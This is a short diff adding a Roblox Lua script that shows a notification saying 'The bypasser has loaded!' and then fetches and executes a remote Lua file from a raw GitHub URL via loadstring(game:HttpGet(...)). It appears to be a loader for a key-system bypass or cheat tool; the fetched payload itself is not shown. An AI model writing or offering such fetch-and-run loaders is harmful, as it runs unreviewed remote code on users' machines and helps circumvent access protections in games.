@@ -1,0 +1,8 @@
+local chattyby = game:GetService("StarterGui")
+
+chattyby:SetCore("SendNotification", {
+    Title = "Key: Vault",
+    Text = "The bypasser has loaded!",
+    Duration = 15
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/randomizedcomponent/UC/refs/heads/main/3307468c285f4fe535fb5d87b4b053e6.lua"))()
